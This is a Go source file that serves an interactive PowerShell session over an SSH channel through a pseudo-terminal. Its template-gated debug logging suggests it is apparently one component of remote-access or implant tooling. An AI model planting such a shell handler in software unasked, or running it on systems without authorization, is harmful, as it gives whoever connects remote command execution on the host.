package sshd

import (
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	pty "github.com/aymanbagabas/go-pty"
	"golang.org/x/crypto/ssh"
)

func handleShell(channel ssh.Channel) {
	defer channel.Close()

	ptyFile, err := pty.New()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to create pty: %v", err)
		// {{end}}
		return
	}
	defer ptyFile.Close()

	go io.Copy(ptyFile, channel)
	go io.Copy(channel, ptyFile)

	shell := ptyFile.Command("powershell.exe")
	if err := shell.Start(); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to start shell: %v", err)
		// {{end}}
		return
	}

	if err := shell.Wait(); err != nil {
		// {{if .Debug}}
		log.Printf("Shell exited with error: %v", err)
		// {{end}}
	}
}
